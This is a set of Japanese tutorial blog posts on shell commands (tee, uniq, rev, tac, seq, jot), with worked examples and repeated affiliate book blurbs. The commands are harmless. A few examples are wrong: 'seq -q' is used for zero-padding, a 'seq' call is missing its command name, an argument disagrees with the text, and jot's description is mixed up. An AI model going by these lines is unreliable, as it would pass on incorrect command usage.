ファイルへのリダイレクトとパイプを同時に行う 以下のコマンドは、画面に出力をしつつ、同じ内容を output.txtに出力しています。\n$ cat /var/log/httpd/access.log | sort | uniq -c | sort -n | head -n15 | tee output.txt 出力するファイルは都度新規作成ではなく追記する teeコマンドは指定されたファイルを新規作成して出力内容をファイルに書き出します。-a オプションを付けることによって、append（追記）することができます。\noutput.txtに出力を追記する\n# 予めファイルを生成しておく $ :\u0026gt;output.txt $ cat /var/log/httpd/access.log | sort | uniq -c | sort -n | head -n15 | tee -a output.txt # 時間をおいて再度実行すると追記される $ cat /var/log/httpd/access.log | sort | uniq -c | sort -n | head -n15 | tee -a output.txt ヒント teeコマンドの -aオプションは非常によく使います。 teeコマンドの出力をファイル書き出す場合、デフォルトは「\u0026gt;」と同等の処理で、-aオプションを付けることによって「\u0026raquo;」と同様に処理となります。 注意 「\u0026raquo;」も同様に tee -aの場合は、予めファイルを作成しておき、そのファイルに対して「\u0026raquo;」やtee -aを行います。追記する最初の処理段階でファイルが存在していることを明示的に書いておくことが重要です。 以下のまとめのように、追記する前に上書きする処理をしておく場合は、あらかじめファイルの生成をする必要はありませんが、明示的に「 $ :\u0026gt; filename 」のようにファイルを生成しておくと、ソースがわかりやすくなります。 まとめ\nechoだと以下のとおりです。ファイルには出力されるが、画面には処理内容が出力されないのでいまいち不便。\n# 上書き $ echo \u0026#34;文字列\u0026#34; \u0026gt; fileName # 追記 $ echo \u0026#34;文字列\u0026#34; \u0026gt;\u0026gt; fileName そこで、処理の出力内容が画面にも表示されるようteeを使う\n# 上書き $ echo \u0026#34;文字列\u0026#34; | tee fileName # 追記 $ echo \u0026#34;文字列\u0026#34; | tee -a fileName 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-28T10:24:32+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-28-01-tee-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-28-01-tee-suzuki/","title":"（２６）【tee】シェルスクリプトコマンド活用紹介"},{"content":"uniqコマンド 重複している行を削除する 大文字／小文字を区別しないで重複行を削除する 重複している行をカウントする uniqコマンド概要 uniqコマンドは、ファイル内の重複している行を扱うコマンドです。具体的には重複している行を除去して表示したり、重複回数を表示したりできます。\nヒント uniqコマンドを実行する前にsortコマンドで並べ替えておく必要があります。 uniqコマンドの書式 uniq [オプション] 入力ファイル [出力ファイル]\nuniqコマンドの主なオプション オプション 意味 -i 比較時に大文字と小文字の違いを無視する -c 各行の前に出現回数を出力する uniqコマンド詳細説明 重複している行を削除する $ uniq ファイル名 で、ファイル内の重複行を取り除くことができます。注意点はあらかじめsortコマンドで並べ替えておく必要があります。\nヒント 実は sort -u というコマンドは、並べ替えつつuniqも実行するという便利なsortコマンドのオプションもあります。一般的にはsort -uを使うことが多いのですが、明示的にuniqコマンドを使うこともあります。 以下のコマンドの出力は同じです。\n$ cat fileName.txt | sort | uniq $ cat fileName.txt | sort -u 大文字／小文字を区別しないで重複行を削除する 「-i」（\u0026ndash;ignore-case）オプションを使うと、大文字／小文字を区別しないで重複する行を削除することができます。\nヒント uniqコマンドのignore-caseは-iです。同時に予め実行しておくsortコマンドもignore-caseも行う必要がありますが、こちらのオプションは -f です。紛らわしいですね。 ヒント 各コマンドのignore-case(大文字小文字を区別しない)は、以下のとおりです。 sort -f uniq -i grep -i 実行結果は以下のとおりです。\n$ cat fileName.txt | sort -f | uniq -i 重複している行をカウントする sortとuniqコマンドの組み合わせで、最も使われるオプションは-cでしょう。「-c」オプションは、重複している行をカウントします。\nアクセスログを並べ替えて表示\ncat /var/log/httpd/access.log | sort | uniq -c | sort -n | head -n15 最初のcatでApacheのaccess.logを出力します。\n次のsortで出力を並べ替えます。\nそしてuniq -cで、重複行の数をカウントし、行頭に頻度数を付与します。\nさらに、行頭の頻度数を数値として扱いsort -nで並べ替えます。\n最後のhead -n15コマンドで、頻度の高いアクセスを出力します。\nヒント CSSなどのファイルを除外する場合は以下のコマンドを使うと良いでしょう。 cat /var/log/httpd/access.log | grep -ive \u0026#34;GET /.*\\.\\(css\\|js\\|jpg\\|gif\\|png\\|swf\\|ico\\)\\ HTTP\u0026#34; | sort | uniq -c | sort -n | head -n15 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-27T15:06:47+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-27-01-uniq-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-27-01-uniq-suzuki/","title":"（２５）【uniq】シェルスクリプトコマンド活用紹介"},{"content":"revコマンド ファイルの各行を反転させる キーボードから入力した内容を反転させる revコマンド概要 reverseの語源を持つ「rev」は、ファイルの各行を末尾から行頭に向かって文字列を反転させ出力します。\nrevコマンドの書式 rev ファイル名\nrevコマンドの主なオプション オプション 意味 オプションはありません。\nrevコマンド詳細説明 ファイルの各行を反転させる $ cat data.txt 1,小出里歩,オデリホ,女,27,85 2,吉野里紗,ヨシノリサ,女,38,894 3,本郷末治,ホンゴウスエジ,男,56,252 4,谷村千代乃,タニムラチヨノ,女,44,556 5,内野響子,ウチノキョウコ,女,44,170 6,塩谷貢,シオタニミツグ,男,34,494 7,児島愛子,コジマアイコ,女,39,675 8,白木俊史,シラキトシフミ,男,57,245 9,飯塚遥佳,イイヅカハルカ,女,20,974 10,阿久津清蔵,アクツセイゾウ,男,9,120 実行結果は以下のとおりです。\n$ cat data.txt | rev 58,72,女,ホリデオ,歩里出小,1 498,83,女,サリノシヨ,紗里野吉,2 252,65,男,ジエスウゴンホ,治末郷本,3 655,44,女,ノヨチラムニタ,乃代千村谷,4 071,44,女,コウョキノチウ,子響野内,5 494,43,男,グツミニタオシ,貢谷塩,6 576,93,女,コイアマジコ,子愛島児,7 542,75,男,ミフシトキラシ,史俊木白,8 479,02,女,カルハカヅイイ,佳遥塚飯,9 021,9,男,ウゾイセツクア,蔵清津久阿,01 ヒント どんなときに使うのでしょうね。むしろ、どう使うのかというよりも、必要になったときに思い出すと激しく便利、といったトリッキーなコマンドのようです。tacとrevはセットで覚えておきましょう。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-26T11:11:28+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-26-01-rev-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-26-01-rev-suzuki/","title":"（２５）【rev】シェルスクリプトコマンド活用紹介"},{"content":"tacコマンド ファイルを最終行から逆順に出力する tacコマンド概要 catコマンドを逆から読んだ「tac」はファイルの最終行から、行単位に逆順に出力するコマンドです。知る人ぞ知るマニア向けコマンドの一つです。\ntacコマンドの書式 tac [オプション] ファイル名\ntacコマンドの主なオプション オプション 意味 特筆するべきオプションはありません。\ntacコマンド詳細説明 ファイルを最終行から逆順に出力する 「tac ファイル名」で、指定したファイルを最終行から逆順に出力します\n$ cat data.txt 1,小出里歩,オデリホ,女,27,85 2,吉野里紗,ヨシノリサ,女,38,894 3,本郷末治,ホンゴウスエジ,男,56,252 4,谷村千代乃,タニムラチヨノ,女,44,556 5,内野響子,ウチノキョウコ,女,44,170 6,塩谷貢,シオタニミツグ,男,34,494 7,児島愛子,コジマアイコ,女,39,675 8,白木俊史,シラキトシフミ,男,57,245 9,飯塚遥佳,イイヅカハルカ,女,20,974 10,阿久津清蔵,アクツセイゾウ,男,9,120 実行結果は以下のとおりです。\n$ cat data.txt | tac 10,阿久津清蔵,アクツセイゾウ,男,9,120 9,飯塚遥佳,イイヅカハルカ,女,20,974 8,白木俊史,シラキトシフミ,男,57,245 7,児島愛子,コジマアイコ,女,39,675 6,塩谷貢,シオタニミツグ,男,34,494 5,内野響子,ウチノキョウコ,女,44,170 4,谷村千代乃,タニムラチヨノ,女,44,556 3,本郷末治,ホンゴウスエジ,男,56,252 2,吉野里紗,ヨシノリサ,女,38,894 1,小出里歩,オデリホ,女,27,85 ヒント catの反転がtac。よく考えたものです。恐れ入りました。 次はrevコマンドについて説明します。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-26T11:10:28+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-26-01-tac-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-26-01-tac-suzuki/","title":"（２４）【tac】シェルスクリプトコマンド活用紹介"},{"content":"seqコマンド 連続番号を出力する 開始の数と間隔を指定する 数字を逆順で出力する 書式を指定して出力する seqコマンド概要 sequenceの語源を持つ「seq」は連続番号の他、一定間隔置きに数字の列を出力する順列番号出力コマンドです。\nseqコマンドの書式 seq [オプション] [開始の数 [増分]] 終了の数\nseqコマンドの主なオプション オプション 意味 -w 先頭を0で埋めて、数字の幅を等しくする -f 書式 数字の書式を指定する -s 文字列 数字の区切りに使う文字列を指定する seqコマンド詳細説明 連続番号を出力する 一般的なseqコマンドの利用例として、 seq 10は、1から10までを出力します。\n１から指定した数までの連続番号を出力する\n$ seq 10 1 2 3 4 5 6 7 8 9 10 出力される数字の桁を併せたい場合はよくあります。\n例えば、二桁で表示させたい場合に、2ではなく02、3ではなく03といった出力です。\nこの場合は「-w」オプションを使用して桁を揃えることができます。例えば seq -w 10 の場合、幅が最大なのは「10」ですから、01、02と2桁で出力されます。\n先頭を0で埋めて桁数をそろえて出力する\n$ seq -q 10 01 02 03 04 05 06 07 08 09 10 開始の数と間隔を指定する 開始の数を指定する場合は seq 5 15 のように、「seq 開始の数 終了の数」と指定します。\nseq 5 （1から5までの数を出力する）\n$ seq 5 1 2 3 4 5 開始位置を指定することもできます。たとえば以下のように、5から始まり15までの順列を出力したい場合は以下のとおりです。\nseq 5 15 （5から15までの数を出力する）\n$ 5 15 5 6 7 8 9 10 11 12 13 14 15 seq 5 2 15 のように、開始と終了の間に増分を指定することもできます。\nseq 5 2 15 （5から15まで、数を2ずつ増やしながら出力する）\n$ seq 5 2 10 5 7 9 数字を逆順で出力する 増分には実数や負の数を指定できます。従って、増分を「-1」と指定することで、数を逆順に出力することが可能です。この場合、開始と終了の数を指定する必要がある点に注意してください。\nseq 5 -1 1 （5から1までの数を出力する）\n$ seq 5 -1 1 5 4 3 2 1 増分を「-1」と指定した場合と同じ効果を、別のコマンドを用いて実現できます。入力を行単位で逆順に出力する「tac」コマンドです。\nseq 5 | tac （seqで1から5を出力し、tacコマンドで逆順に並び替えている）\n$ seq 5 | tac 5 4 3 2 1 書式を指定して出力する 「-f」オプションを用いて数字の書式を指定することができます。\n「%g」を利用することで、整数で出力する際の桁数を指定できます。例えば、4桁の幅であれば「%4g」、4桁で「0001」のようにゼロで埋めるならば「%04g」のようにします。\nseq -f 書式 3 （1から3までの数値を指定した書式で出力する）\n$ seq -f \u0026#34;%04g\u0026#34; 3 0001 0002 0003 $ seq -f \u0026#34;IMG%04g.jpg\u0026#34; 3 IMG0001.jpg IMG0002.jpg IMG0003.jpg ヒント 次はtacコマンドについて説明します。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-26T10:40:19+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-26-01-seq-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-26-01-seq-suzuki/","title":"（２３）【seq】シェルスクリプトコマンド活用紹介"},{"content":"jotコマンド 連番を生成する 文字列と組み合わせた連番を作成する printf のフォーマットで出力する 連番の範囲を指定して出力する 乱数を出力する jotコマンド概要 jotコマンドは、連番数字はもちろん、連番付きのアルファベットを生成したり、ランダムな数字を生成したりできます。似たコマンドに seqや$RANDOM コマンドがあります。\njotコマンドの書式 jot [オプション]\njotコマンドの主なオプション オプション 意味 -w [文字列] 文字列を指定する -r 乱数を出力する jotコマンド詳細説明 連番を作る 「jot ファイル名」で、ファイルの中身を並べ替えます。\nさっそく連番を出力してみます。\nまずは10個の連番を出力します。\n$ jot 10 1 2 3 4 5 6 7 8 9 10 seqコマンドではこうなります\n$ seq 10 1 2 3 4 5 6 7 8 9 10 文字列と組み合わせた連番を作成する 文字列 abc に続けて10個の連番を作成します。\n$ jot -w abc 10 abc1 abc2 abc3 abc4 abc5 abc6 abc7 abc8 abc9 abc10 次の項でも説明しますが、seqコマンドでも同様のことができます。\n$ seq -f \u0026#34;%04g\u0026#34; 3 0001 0002 0003 seqコマンドでもprintfフォーマットで出力できますので、文字列と連結した連番の生成もできます。\n$ seq -f \u0026#34;IMG%04g.jpg\u0026#34; 3 IMG0001.jpg IMG0002.jpg IMG0003.jpg では、次の項ではjotコマンドでprintfのフォーマットで出力する方法を具体的に説明します。\nprintf のフォーマットで出力する $ jot -w \u0026#39;name%03d\u0026#39; 10 name001 name002 name003 name004 name005 name006 name007 name008 name009 name010 連番の範囲を指定して出力する 5からの連番を３つ出力します。\n$ jot -w \u0026#39;name%03d\u0026#39; 3 5 name005 name006 name007 10からの連番を５つ出力します。\n$ jot -w \u0026#39;name%03d\u0026#39; 5 10 name010 name011 name012 name013 name014 bash-5.1$ 乱数を出力する 1から10までの乱数を５つ出力します。\n-r 5 は乱数を５つ出力することを示します。\n1 10 は、１から１０までの範囲でといういみとなります。\n1から100までの範囲で乱数を５つ出力すると以下の通りになります。\njot -r 5 1 100 1 6 17 91 46 print文フォーマットで、1から100までの範囲で乱数を５つ出力してみます。\n$ jot -w \u0026#39;name%03d\u0026#39; -r 5 1 10 name008 name006 name007 name001 name006 ヒント 連番を作成する場合はseq、乱数を扱う場合は $RANDOMを使う場合が多いと思いますが、jotコマンドは、seq,$RANDOMを足し合わせて、同等それ以上の実行が可能です。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 